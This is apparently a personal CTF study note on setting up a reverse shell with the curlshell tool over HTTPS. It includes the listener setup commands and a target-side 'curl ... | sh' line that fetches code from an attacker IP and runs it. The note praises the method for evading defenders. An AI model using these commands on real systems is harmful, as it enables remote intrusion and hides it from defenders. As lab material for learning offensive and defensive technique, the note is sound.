
2025-10-24 19:01

Source: #CTF 

Tags: [[revshell]]

Different way of catching reverse connection from your target. This is using [[Tags/curl|curl]] shell which leverages HTTPS to tunnel the connection to your machine. 

[[netcat]] may not be installed or other traditional tools. Sometimes even the shell is different and you cannot just manipulate the device networking stack easily. If curl is installed, then you still have a chance to get a reverse connection.
### Setting up the shell

**On our system**

1. Clone this [repo](https://github.com/SkyperTHC/curlshell)

2. Since the connection will be encrypted, we need to generate a self-signed certificate. 
```sh
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
```

3. We can now run curl shell. 
```sh
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```
We pass the certificate, the private key, and the port we want to listen on. 

**Then from the target**

we use curl to connect to our attacker IP and port.
```sh
curl -skfl https://172.16.117.99:8080 | sh
```
Don't forget about the HTTPS at the beginning. Lastly, we need to pipe this to a shell. 

Then you should see a successful call back from the attacker.
Another benefit of using curl shell is that your connections are encrypted. That means you can protect yourself from defenders. Aside from that, the process running inside the victim will look less suspicious compared to normal reverse shells.

### References
[Hiding your callback through HTTPS](https://www.youtube.com/watch?v=DBy2e6HrrD0)